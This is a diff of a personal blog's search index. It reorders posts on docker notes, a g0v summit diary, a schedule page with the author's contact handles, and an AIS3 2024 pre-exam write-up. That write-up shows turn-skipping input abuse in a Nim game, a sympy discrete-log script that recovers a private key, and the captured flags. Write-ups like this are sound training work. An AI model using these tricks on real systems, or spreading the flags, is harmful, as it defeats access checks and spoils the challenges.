@@ -1,6 +1,48 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>docker參考資料</title>
+    <url>/20241114/</url>
+    <content><![CDATA[<h1 id="docker-25-03-14"><a href="#docker-25-03-14" class="headerlink" title="docker (25&#x2F;03&#x2F;14)"></a>docker (25&#x2F;03&#x2F;14)</h1><p>查容器</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker ps -a</span><br></pre></td></tr></table></figure>
+<p>關掉image</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker-compose down</span><br></pre></td></tr></table></figure>
+<p>重新建構映像檔</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker-compose build </span><br></pre></td></tr></table></figure>
+<p>啟動服務</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker-compose up -d </span><br></pre></td></tr></table></figure>
+
+<p>查port</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netstat -tulnp</span><br></pre></td></tr></table></figure>
+
+<p>查server目前的IPv4公網IP</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -4 ifconfig.me </span><br></pre></td></tr></table></figure>
+
+<hr>
+<h1 id="docker-2-24-11-14"><a href="#docker-2-24-11-14" class="headerlink" title="docker 2 (24&#x2F;11&#x2F;14)"></a>docker 2 (24&#x2F;11&#x2F;14)</h1><p>檢查容器</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker ps -a</span><br></pre></td></tr></table></figure>
+
+<p>啟動並進入容器</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker start demo_container</span><br><span class="line">docker exec -it demo_container /bin/bash</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>進容器後</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">source /opt/ros/humble/setup.bash</span><br><span class="line">cd demo</span><br><span class="line">bash start.sh</span><br></pre></td></tr></table></figure>
+
+<p>ctrl+d 退出容器</p>
+<p>停止容器</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker container stop demo_container</span><br></pre></td></tr></table></figure>
+
+<p>可視化</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 visualization.py</span><br></pre></td></tr></table></figure>
+<p><a href="https://youtu.be/HGhSR-Vbb-E">https://youtu.be/HGhSR-Vbb-E</a></p>
+<p><a href="https://chewu-0319.github.io/personal/images/1114.pdf">1114</a></p>
+<p><a href="https://chewu-0319.github.io/personal/images/1115.pdf">1115</a></p>
+]]></content>
+      <categories>
+        <category>參考資料</category>
+      </categories>
+  </entry>
+  <entry>
     <title>常見port大整理</title>
     <url>/20241011/</url>
     <content><![CDATA[<ol>
@@ -178,48 +220,6 @@
 ]]></content>
       <categories>
         <category>資安</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>docker參考資料</title>
-    <url>/20241114/</url>
-    <content><![CDATA[<h1 id="docker-25-03-14"><a href="#docker-25-03-14" class="headerlink" title="docker (25&#x2F;03&#x2F;14)"></a>docker (25&#x2F;03&#x2F;14)</h1><p>查容器</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker ps -a</span><br></pre></td></tr></table></figure>
-<p>關掉image</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker-compose down</span><br></pre></td></tr></table></figure>
-<p>重新建構映像檔</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker-compose build </span><br></pre></td></tr></table></figure>
-<p>啟動服務</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker-compose up -d </span><br></pre></td></tr></table></figure>
-
-<p>查port</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netstat -tulnp</span><br></pre></td></tr></table></figure>
-
-<p>查server目前的IPv4公網IP</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -4 ifconfig.me </span><br></pre></td></tr></table></figure>
-
-<hr>
-<h1 id="docker-2-24-11-14"><a href="#docker-2-24-11-14" class="headerlink" title="docker 2 (24&#x2F;11&#x2F;14)"></a>docker 2 (24&#x2F;11&#x2F;14)</h1><p>檢查容器</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker ps -a</span><br></pre></td></tr></table></figure>
-
-<p>啟動並進入容器</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker start demo_container</span><br><span class="line">docker exec -it demo_container /bin/bash</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>進容器後</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">source /opt/ros/humble/setup.bash</span><br><span class="line">cd demo</span><br><span class="line">bash start.sh</span><br></pre></td></tr></table></figure>
-
-<p>ctrl+d 退出容器</p>
-<p>停止容器</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker container stop demo_container</span><br></pre></td></tr></table></figure>
-
-<p>可視化</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 visualization.py</span><br></pre></td></tr></table></figure>
-<p><a href="https://youtu.be/HGhSR-Vbb-E">https://youtu.be/HGhSR-Vbb-E</a></p>
-<p><a href="https://chewu-0319.github.io/personal/images/1114.pdf">1114</a></p>
-<p><a href="https://chewu-0319.github.io/personal/images/1115.pdf">1115</a></p>
-]]></content>
-      <categories>
-        <category>參考資料</category>
       </categories>
   </entry>
   <entry>
@@ -442,34 +442,6 @@
       </categories>
   </entry>
   <entry>
-    <title>AIS3 2024 pre-exam</title>
-    <url>/AIS3pre-exam/</url>
-    <content><![CDATA[<h1 id="AIS3-2024-pre-exam-write-up"><a href="#AIS3-2024-pre-exam-write-up" class="headerlink" title="AIS3 2024 pre-exam write up"></a>AIS3 2024 pre-exam write up</h1><p>第一次寫write up :D</p>
-<h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="welcome-100"><a href="#welcome-100" class="headerlink" title="welcome[100]"></a>welcome[100]</h2><p>略</p>
-<h2 id="Quantum-Nim-Heist-100"><a href="#Quantum-Nim-Heist-100" class="headerlink" title="Quantum Nim Heist[100]"></a>Quantum Nim Heist[100]</h2><p>一開始看code看很久都沒找到破綻，花超多時間在程式裡大海撈針，沒想到意外發現小漏洞，<br>反正就是讓值超出預期，但我其實不確定這做法的專有名詞(?<br>當他問which pile do you choose?的時候，<br>正常應該要回答是第幾pile，但如果什麼都不回答直接按enter或輸入-1，會發現可以直接跳過一回合，<br>直到最後一回合再記得把最後一個stones remove掉。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line">it&#x27;s your turn to move! what do you choose?</span><br><span class="line">+--------------------- moved ---------------------+</span><br><span class="line">| you removed 2 stones from pile 1                |</span><br><span class="line">+---+-------------- stones info ------------------+</span><br><span class="line">| 0 | oo                                          |</span><br><span class="line">| 1 | oo                                          |</span><br><span class="line">+--------------------- moved ---------------------+</span><br><span class="line">| i removed 1 stones from pile 1                  |</span><br><span class="line">+---+-------------- stones info ------------------+</span><br><span class="line">| 0 | oo                                          |</span><br><span class="line">| 1 | o                                           |</span><br><span class="line">+---+--------------- game menu -------------------+</span><br><span class="line">| 0 | make a move                                 |</span><br><span class="line">| 1 | save the current game and leave             |</span><br><span class="line">| 2 | resign the game                             |</span><br><span class="line">+---+---------------------------------------------+</span><br><span class="line">it&#x27;s your turn to move! what do you choose?        </span><br><span class="line">+--------------------- moved ---------------------+</span><br><span class="line">| you removed 1 stones from pile 1                |</span><br><span class="line">+---+-------------- stones info ------------------+</span><br><span class="line">| 0 | oo                                          | </span><br><span class="line">| 1 | o                                           |</span><br><span class="line">+--------------------- moved ---------------------+</span><br><span class="line">| i removed 1 stones from pile 0                  | </span><br><span class="line">+---+-------------- stones info ------------------+</span><br><span class="line">| 0 | o                                           |</span><br><span class="line">| 1 | o                                           | </span><br><span class="line">+---+--------------- game menu -------------------+  </span><br><span class="line">| 0 | make a move                                 |   </span><br><span class="line">| 1 | save the current game and leave             |   </span><br><span class="line">| 2 | resign the game                             |   </span><br><span class="line">+---+---------------------------------------------+   </span><br><span class="line">it&#x27;s your turn to move! what do you choose?           </span><br><span class="line">+--------------------- moved ---------------------+   </span><br><span class="line">| you removed 1 stones from pile 0                |   </span><br><span class="line">+---+-------------- stones info ------------------+   </span><br><span class="line">| 0 | o                                           |    </span><br><span class="line">| 1 | o                                           |   </span><br><span class="line">+--------------------- moved ---------------------+   </span><br><span class="line">| i removed 1 stones from pile 0                  |   </span><br><span class="line">+---+-------------- stones info ------------------+   </span><br><span class="line">| 0 | o                                           |   </span><br><span class="line">+---+--------------- game menu -------------------+   </span><br><span class="line">| 0 | make a move                                 |   </span><br><span class="line">| 1 | save the current game and leave             |   </span><br><span class="line">| 2 | resign the game                             |  </span><br><span class="line">+---+---------------------------------------------+  </span><br><span class="line">it&#x27;s your turn to move! what do you choose? 0         </span><br><span class="line">which pile do you choose? 0                           </span><br><span class="line">how many stones do you remove? 1                      </span><br><span class="line">+---------------- congratulations ----------------+   </span><br><span class="line">| you are a true grandmaster of chess! here is    |   </span><br><span class="line">| the flag for you:                               |   </span><br><span class="line">| AIS3&#123;Ar3_y0u_a_N1m_ma57er_0r_a_Crypt0_ma57er?&#125;  |   </span><br><span class="line">+-------------------------------------------------+ </span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<h2 id="Three-Dimensional-Secret"><a href="#Three-Dimensional-Secret" class="headerlink" title="Three Dimensional Secret"></a>Three Dimensional Secret</h2><p>打開封包檔<br>看到很多Protocol&#x3D;TCP，隨機點一個<br><img src="/images/p9.png"></p>
-<p>選follow -&gt; TCP Stream<br><img src="/images/p10.png"></p>
-<p>打開後會出現很多同一格式的程式碼<br>拿去問chatgpt，得知這是G code<br><img src="/images/p11.png"></p>
-<p>上網找預覽器，找到<a href="https://nraynaud.github.io/webgcode/">https://nraynaud.github.io/webgcode/</a><br><img src="/images/p12.png"></p>
-<p>貼上code就看到flag了</p>
-<h1 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h1><h2 id="zkp"><a href="#zkp" class="headerlink" title="zkp"></a>zkp</h2><p>原本想說開暴力解，吃完飯發現還是沒結果，<br>上網找資料找到這個酷酷的函式庫叫sympy，大數字也可以快速解，<br>用sympy去計算離散對數r，再去算sk，<br>求得sk後丟long_to_bytes求回flag</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">!pip install sympy</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> inverse</span><br><span class="line"><span class="keyword">from</span> sympy.ntheory <span class="keyword">import</span> discrete_log</span><br><span class="line"></span><br><span class="line"><span class="comment"># 已知參數</span></span><br><span class="line">p = <span class="number">912963562570713895762123712634341582363191342435924527885311975797578046400116904692505817547350929619596093083745446525856149291591598712142696114753807416455553636357128701771057485027781550780145668058332461392878693207262984011086549089459904749465167095482671894984474035487400352761994560452501497000487</span></span><br><span class="line">g = <span class="number">5</span></span><br><span class="line">y = <span class="number">826538666839613533825164219540577914201103248283631882579415248247469603672292332561005185045449294103457059566058782307774879654805356212117148864755019033392691510181464751398765490686084806155442759849410837406192708511190585484331707794669398717997173649869228717077858848442336016926370038781486833717341</span></span><br><span class="line">a = <span class="number">837391429146716246298265649828833926553703307768263532882119633652369160923460038502759864396719595556822579283450060054716753545203402598089323793321805639129260667950080636462204135426887388899955615207806039627983773534304007953073586374003734715079722274887416433453079445822219423995951703135829496007286</span>        </span><br><span class="line">c = <span class="number">1</span> <span class="comment"># 這邊用1可以節省運算時間</span></span><br><span class="line">w = <span class="number">394811387946114683904252174454710537206578693342055809178279464013047561646863743919996435695718914181044539464633729592712968512748007403695056092396246866848389859706990642501065525104839776919236901735230456614618350145301893017979866181624159788935390202502224091369603614245766192646548573130781044536668</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 用sympy計算離散對數r</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">compute_r</span>(<span class="params">g, a, p</span>):</span><br><span class="line">    <span class="keyword">return</span> discrete_log(p, a, g)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 算sk</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">compute_sk</span>(<span class="params">p, g, y, a, w, c</span>):</span><br><span class="line">    r = compute_r(g, a, p)</span><br><span class="line">    p_minus_1 = p - <span class="number">1</span></span><br><span class="line">    c_inv = inverse(c, p_minus_1)</span><br><span class="line">    sk = (w - r) * c_inv % p_minus_1</span><br><span class="line">    <span class="keyword">return</span> sk</span><br><span class="line"></span><br><span class="line"><span class="comment"># 計算 輸出sk</span></span><br><span class="line">sk = compute_sk(p, g, y, a, w, c)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Computed sk:&quot;</span>, sk)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Requirement already satisfied: sympy in /usr/local/lib/python3.10/dist-packages (1.12)</span><br><span class="line">Requirement already satisfied: mpmath&gt;=0.19 in /usr/local/lib/python3.10/dist-packages (from sympy) (1.3.0)</span><br><span class="line">Computed sk: 796124238634205301132370159483254378466188675876173490569851599404569838177493188146821283009169954596409601313555455638014751336770403395328637</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line"><span class="comment"># 已知參數</span></span><br><span class="line">sk = <span class="number">796124238634205301132370159483254378466188675876173490569851599404569838177493188146821283009169954596409601313555455638014751336770403395328637</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 私鑰轉flag</span></span><br><span class="line">flag = long_to_bytes(sk)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Flag:&quot;</span>, flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Flag: b&#x27;AIS3&#123;ToSolveADiscreteLogProblemWhithSmoothPIsSoEZZZZZZZZZZZ&#125;&#x27;</span><br></pre></td></tr></table></figure>
-
-<hr>
-<!-- Start of CuterCounter Code -->
-<p><a href="https://www.cutercounter.com/traditional-chinese-nn/" target="_blank" style="pointer-events: none;"><img src="https://www.cutercounter.com/hits.php?id=huexqdano&nd=6&style=11" border="0" alt="免費網站計數器"></a></p>
-<!-- End of CuterCounter Code -->
-]]></content>
-      <categories>
-        <category>資安</category>
-      </categories>
-  </entry>
-  <entry>
     <title>Local PII Extractor：支援中文的本地個資識別與匿名化工具</title>
     <url>/20250528/</url>
     <content><![CDATA[<h1 id="🛡️-Local-PII-Extractor：支援中文的本地個資識別與匿名化工具"><a href="#🛡️-Local-PII-Extractor：支援中文的本地個資識別與匿名化工具" class="headerlink" title="🛡️ Local PII Extractor：支援中文的本地個資識別與匿名化工具"></a>🛡️ Local PII Extractor：支援中文的本地個資識別與匿名化工具</h1><p>GitHub Repository：<a href="https://github.com/chewu-0319/Local_PII_Extractor">https://github.com/chewu-0319/Local_PII_Extractor</a></p>
@@ -525,6 +497,34 @@
 <li><strong>提升識別準確率</strong>：引入更先進的 NLP 模型，提升個資識別的準確性。</li>
 <li><strong>增加批次處理功能</strong>：允許使用者一次處理多個檔案，提高效率。</li>
 </ul>
+]]></content>
+      <categories>
+        <category>資安</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>AIS3 2024 pre-exam</title>
+    <url>/AIS3pre-exam/</url>
+    <content><![CDATA[<h1 id="AIS3-2024-pre-exam-write-up"><a href="#AIS3-2024-pre-exam-write-up" class="headerlink" title="AIS3 2024 pre-exam write up"></a>AIS3 2024 pre-exam write up</h1><p>第一次寫write up :D</p>
+<h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="welcome-100"><a href="#welcome-100" class="headerlink" title="welcome[100]"></a>welcome[100]</h2><p>略</p>
+<h2 id="Quantum-Nim-Heist-100"><a href="#Quantum-Nim-Heist-100" class="headerlink" title="Quantum Nim Heist[100]"></a>Quantum Nim Heist[100]</h2><p>一開始看code看很久都沒找到破綻，花超多時間在程式裡大海撈針，沒想到意外發現小漏洞，<br>反正就是讓值超出預期，但我其實不確定這做法的專有名詞(?<br>當他問which pile do you choose?的時候，<br>正常應該要回答是第幾pile，但如果什麼都不回答直接按enter或輸入-1，會發現可以直接跳過一回合，<br>直到最後一回合再記得把最後一個stones remove掉。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line">it&#x27;s your turn to move! what do you choose?</span><br><span class="line">+--------------------- moved ---------------------+</span><br><span class="line">| you removed 2 stones from pile 1                |</span><br><span class="line">+---+-------------- stones info ------------------+</span><br><span class="line">| 0 | oo                                          |</span><br><span class="line">| 1 | oo                                          |</span><br><span class="line">+--------------------- moved ---------------------+</span><br><span class="line">| i removed 1 stones from pile 1                  |</span><br><span class="line">+---+-------------- stones info ------------------+</span><br><span class="line">| 0 | oo                                          |</span><br><span class="line">| 1 | o                                           |</span><br><span class="line">+---+--------------- game menu -------------------+</span><br><span class="line">| 0 | make a move                                 |</span><br><span class="line">| 1 | save the current game and leave             |</span><br><span class="line">| 2 | resign the game                             |</span><br><span class="line">+---+---------------------------------------------+</span><br><span class="line">it&#x27;s your turn to move! what do you choose?        </span><br><span class="line">+--------------------- moved ---------------------+</span><br><span class="line">| you removed 1 stones from pile 1                |</span><br><span class="line">+---+-------------- stones info ------------------+</span><br><span class="line">| 0 | oo                                          | </span><br><span class="line">| 1 | o                                           |</span><br><span class="line">+--------------------- moved ---------------------+</span><br><span class="line">| i removed 1 stones from pile 0                  | </span><br><span class="line">+---+-------------- stones info ------------------+</span><br><span class="line">| 0 | o                                           |</span><br><span class="line">| 1 | o                                           | </span><br><span class="line">+---+--------------- game menu -------------------+  </span><br><span class="line">| 0 | make a move                                 |   </span><br><span class="line">| 1 | save the current game and leave             |   </span><br><span class="line">| 2 | resign the game                             |   </span><br><span class="line">+---+---------------------------------------------+   </span><br><span class="line">it&#x27;s your turn to move! what do you choose?           </span><br><span class="line">+--------------------- moved ---------------------+   </span><br><span class="line">| you removed 1 stones from pile 0                |   </span><br><span class="line">+---+-------------- stones info ------------------+   </span><br><span class="line">| 0 | o                                           |    </span><br><span class="line">| 1 | o                                           |   </span><br><span class="line">+--------------------- moved ---------------------+   </span><br><span class="line">| i removed 1 stones from pile 0                  |   </span><br><span class="line">+---+-------------- stones info ------------------+   </span><br><span class="line">| 0 | o                                           |   </span><br><span class="line">+---+--------------- game menu -------------------+   </span><br><span class="line">| 0 | make a move                                 |   </span><br><span class="line">| 1 | save the current game and leave             |   </span><br><span class="line">| 2 | resign the game                             |  </span><br><span class="line">+---+---------------------------------------------+  </span><br><span class="line">it&#x27;s your turn to move! what do you choose? 0         </span><br><span class="line">which pile do you choose? 0                           </span><br><span class="line">how many stones do you remove? 1                      </span><br><span class="line">+---------------- congratulations ----------------+   </span><br><span class="line">| you are a true grandmaster of chess! here is    |   </span><br><span class="line">| the flag for you:                               |   </span><br><span class="line">| AIS3&#123;Ar3_y0u_a_N1m_ma57er_0r_a_Crypt0_ma57er?&#125;  |   </span><br><span class="line">+-------------------------------------------------+ </span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h2 id="Three-Dimensional-Secret"><a href="#Three-Dimensional-Secret" class="headerlink" title="Three Dimensional Secret"></a>Three Dimensional Secret</h2><p>打開封包檔<br>看到很多Protocol&#x3D;TCP，隨機點一個<br><img src="/images/p9.png"></p>
+<p>選follow -&gt; TCP Stream<br><img src="/images/p10.png"></p>
+<p>打開後會出現很多同一格式的程式碼<br>拿去問chatgpt，得知這是G code<br><img src="/images/p11.png"></p>
+<p>上網找預覽器，找到<a href="https://nraynaud.github.io/webgcode/">https://nraynaud.github.io/webgcode/</a><br><img src="/images/p12.png"></p>
+<p>貼上code就看到flag了</p>
+<h1 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h1><h2 id="zkp"><a href="#zkp" class="headerlink" title="zkp"></a>zkp</h2><p>原本想說開暴力解，吃完飯發現還是沒結果，<br>上網找資料找到這個酷酷的函式庫叫sympy，大數字也可以快速解，<br>用sympy去計算離散對數r，再去算sk，<br>求得sk後丟long_to_bytes求回flag</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">!pip install sympy</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> inverse</span><br><span class="line"><span class="keyword">from</span> sympy.ntheory <span class="keyword">import</span> discrete_log</span><br><span class="line"></span><br><span class="line"><span class="comment"># 已知參數</span></span><br><span class="line">p = <span class="number">912963562570713895762123712634341582363191342435924527885311975797578046400116904692505817547350929619596093083745446525856149291591598712142696114753807416455553636357128701771057485027781550780145668058332461392878693207262984011086549089459904749465167095482671894984474035487400352761994560452501497000487</span></span><br><span class="line">g = <span class="number">5</span></span><br><span class="line">y = <span class="number">826538666839613533825164219540577914201103248283631882579415248247469603672292332561005185045449294103457059566058782307774879654805356212117148864755019033392691510181464751398765490686084806155442759849410837406192708511190585484331707794669398717997173649869228717077858848442336016926370038781486833717341</span></span><br><span class="line">a = <span class="number">837391429146716246298265649828833926553703307768263532882119633652369160923460038502759864396719595556822579283450060054716753545203402598089323793321805639129260667950080636462204135426887388899955615207806039627983773534304007953073586374003734715079722274887416433453079445822219423995951703135829496007286</span>        </span><br><span class="line">c = <span class="number">1</span> <span class="comment"># 這邊用1可以節省運算時間</span></span><br><span class="line">w = <span class="number">394811387946114683904252174454710537206578693342055809178279464013047561646863743919996435695718914181044539464633729592712968512748007403695056092396246866848389859706990642501065525104839776919236901735230456614618350145301893017979866181624159788935390202502224091369603614245766192646548573130781044536668</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 用sympy計算離散對數r</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">compute_r</span>(<span class="params">g, a, p</span>):</span><br><span class="line">    <span class="keyword">return</span> discrete_log(p, a, g)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 算sk</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">compute_sk</span>(<span class="params">p, g, y, a, w, c</span>):</span><br><span class="line">    r = compute_r(g, a, p)</span><br><span class="line">    p_minus_1 = p - <span class="number">1</span></span><br><span class="line">    c_inv = inverse(c, p_minus_1)</span><br><span class="line">    sk = (w - r) * c_inv % p_minus_1</span><br><span class="line">    <span class="keyword">return</span> sk</span><br><span class="line"></span><br><span class="line"><span class="comment"># 計算 輸出sk</span></span><br><span class="line">sk = compute_sk(p, g, y, a, w, c)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Computed sk:&quot;</span>, sk)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Requirement already satisfied: sympy in /usr/local/lib/python3.10/dist-packages (1.12)</span><br><span class="line">Requirement already satisfied: mpmath&gt;=0.19 in /usr/local/lib/python3.10/dist-packages (from sympy) (1.3.0)</span><br><span class="line">Computed sk: 796124238634205301132370159483254378466188675876173490569851599404569838177493188146821283009169954596409601313555455638014751336770403395328637</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line"><span class="comment"># 已知參數</span></span><br><span class="line">sk = <span class="number">796124238634205301132370159483254378466188675876173490569851599404569838177493188146821283009169954596409601313555455638014751336770403395328637</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 私鑰轉flag</span></span><br><span class="line">flag = long_to_bytes(sk)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Flag:&quot;</span>, flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Flag: b&#x27;AIS3&#123;ToSolveADiscreteLogProblemWhithSmoothPIsSoEZZZZZZZZZZZ&#125;&#x27;</span><br></pre></td></tr></table></figure>
+
+<hr>
+<!-- Start of CuterCounter Code -->
+<p><a href="https://www.cutercounter.com/traditional-chinese-nn/" target="_blank" style="pointer-events: none;"><img src="https://www.cutercounter.com/hits.php?id=huexqdano&nd=6&style=11" border="0" alt="免費網站計數器"></a></p>
+<!-- End of CuterCounter Code -->
 ]]></content>
       <categories>
         <category>資安</category>
@@ -1002,6 +1002,100 @@ ABaB
       </categories>
   </entry>
   <entry>
+    <title>g0v summit 2024</title>
+    <url>/g0vsummit/</url>
+    <content><![CDATA[<h1 id="g0v-summit"><a href="#g0v-summit" class="headerlink" title="g0v summit"></a>g0v summit</h1><h2 id="我都在幹嘛"><a href="#我都在幹嘛" class="headerlink" title="我都在幹嘛?"></a>我都在幹嘛?</h2><ul>
+<li>工作人員<ul>
+<li>搬椅子</li>
+<li>搬桌子</li>
+<li>場佈</li>
+<li>動線規劃</li>
+<li>拆</li>
+<li>坐在電梯前指引</li>
+<li>被外國人問路</li>
+</ul>
+</li>
+<li>福利<ul>
+<li>吃吃吃吃吃吃吃吃…</li>
+<li>喝喝喝喝喝喝喝喝…</li>
+<li>免費住宿 中研院活動中心</li>
+<li>仙草茶 (呵</li>
+</ul>
+</li>
+</ul>
+<h2 id="Day-0-場佈"><a href="#Day-0-場佈" class="headerlink" title="Day 0(場佈)"></a>Day 0(場佈)</h2><ul>
+<li>搬椅子</li>
+<li>搬桌子</li>
+<li>動線規劃</li>
+<li>吃便當</li>
+<li>晚上去饒河夜市</li>
+</ul>
+<h2 id="Day-1"><a href="#Day-1" class="headerlink" title="Day 1"></a>Day 1</h2><ul>
+<li>早餐三明治+紅茶</li>
+<li>坐在電梯前好幾個小時</li>
+<li>R0搬椅子</li>
+<li>閒逛</li>
+<li>吃漢堡 吃撈麵</li>
+<li>聽南韓講者超酷</li>
+<li>有夠累</li>
+<li>睡在VIP room</li>
+<li>房間看西甲</li>
+<li>還以為有夜唱</li>
+</ul>
+<h2 id="Day-2"><a href="#Day-2" class="headerlink" title="Day 2"></a>Day 2</h2><ul>
+<li>繼續吃</li>
+<li>聽台灣爬蟲開源資料講者 超幽默</li>
+<li>仙草茶</li>
+<li>有個阿北專門來吃東西的</li>
+<li>收桌子</li>
+<li>拆東西</li>
+<li>在閉幕簡報上看到自己 很感動</li>
+<li>慶功宴 佛跳牆 龍蝦 雞佛 啤酒好欸</li>
+<li>才知道現場很多都是資工大佬 頂大好電</li>
+<li>大家都很好聊 一堆E人</li>
+<li>CPY有問題找他就對了 兆翌超好聊 喬不會喝酒笑死 柚子講者超電 賴彥江超幽默 </li>
+<li>口譯大哥說他18歲 pm5光頭超好認 攝影大哥敬酒*n次 室友雨辰居然是文組的</li>
+<li>有人喝醉超好笑 啤酒而已欸</li>
+<li>搭高鐵 好不捨</li>
+<li>整個g0v氣氛好好 好喜歡 2026再來!</li>
+</ul>
+<h1 id="總結"><a href="#總結" class="headerlink" title="總結"></a>總結</h1><p>我愛g0v summit，氣氛好讚，工人福利給過，認識好多新朋友，g0v summit 2026見!</p>
+<hr>
+<!-- Start of CuterCounter Code -->
+<p><a href="https://www.cutercounter.com/traditional-chinese-nn/" target="_blank" style="pointer-events: none;"><img src="https://www.cutercounter.com/hits.php?id=huxpnnqf&nd=6&style=11" border="0" alt="網頁計數器"></a></p>
+<!-- End of CuterCounter Code -->
+]]></content>
+      <categories>
+        <category>紀錄</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>個人時間表</title>
+    <url>/personal_schedule/</url>
+    <content><![CDATA[<h1 id="此為-2024-10月-2025寒假前-日程表"><a href="#此為-2024-10月-2025寒假前-日程表" class="headerlink" title="此為 2024&#x2F;10月-2025寒假前 日程表"></a>此為 2024&#x2F;10月-2025寒假前 日程表</h1><p><img src="/images/sch.png"></p>
+<ul>
+<li>藍色: 在學校</li>
+<li>綠色: 在家裡忙</li>
+<li>紫色: 社團</li>
+<li>灰色: 空閒</li>
+</ul>
+<p>聯絡方式:</p>
+<ul>
+<li>email: <a href="mailto:dylan.jc2222@gmail.com" title="吳昕哲">吳昕哲</a></li>
+<li>discord: <a href="https://discordapp.com/users/768889520280043561" title="che哲#4541">che哲#4541</a></li>
+<li>instagram: <a href="https://www.instagram.com/che._.wu/" title="che._.wu">che._.wu</a></li>
+</ul>
+<hr>
+<!-- Start of CuterCounter Code -->
+<p><a href="https://www.cutercounter.com/traditional-chinese-nn/" target="_blank" style="pointer-events: none;"><img src="https://www.cutercounter.com/hits.php?id=hxqxdco&nd=6&style=11" border="0" alt="免費網站計數器"></a></p>
+<!-- End of CuterCounter Code -->
+
+]]></content>
+      <categories>
+        <category>個人時間表</category>
+      </categories>
+  </entry>
+  <entry>
     <title>特殊選才</title>
     <url>/interview/</url>
     <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>嗨嗨 我是che，成功用特殊選材上岸啦!! <a href="https://chewu-0319.github.io/personal/about/">這裡</a> 有較詳細的個人經歷。</p>
@@ -1274,100 +1368,6 @@ ABaB
       </categories>
   </entry>
   <entry>
-    <title>g0v summit 2024</title>
-    <url>/g0vsummit/</url>
-    <content><![CDATA[<h1 id="g0v-summit"><a href="#g0v-summit" class="headerlink" title="g0v summit"></a>g0v summit</h1><h2 id="我都在幹嘛"><a href="#我都在幹嘛" class="headerlink" title="我都在幹嘛?"></a>我都在幹嘛?</h2><ul>
-<li>工作人員<ul>
